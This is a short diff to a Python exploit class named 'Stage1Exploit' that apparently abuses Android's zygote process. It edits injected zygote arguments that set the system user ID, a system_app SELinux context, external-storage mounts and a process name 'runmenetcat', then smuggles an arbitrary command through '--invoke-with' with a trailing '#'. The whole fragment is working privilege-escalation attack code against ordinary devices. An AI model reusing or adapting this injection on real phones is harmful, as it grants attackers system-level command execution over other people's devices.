@@ -191,11 +191,14 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
-            "--setgroups=3003,1065",
+            "--setgroups=3003",
+            "--mount-external-read",
+            "--mount-external-write",
             "--runtime-args",
             "--seinfo=platform:system_app:complete",
             "--runtime-flags=1",
             "--nice-name=runmenetcat",
+            "--setgroups=1065",
             "--invoke-with",
             f"{command}#",
         ]
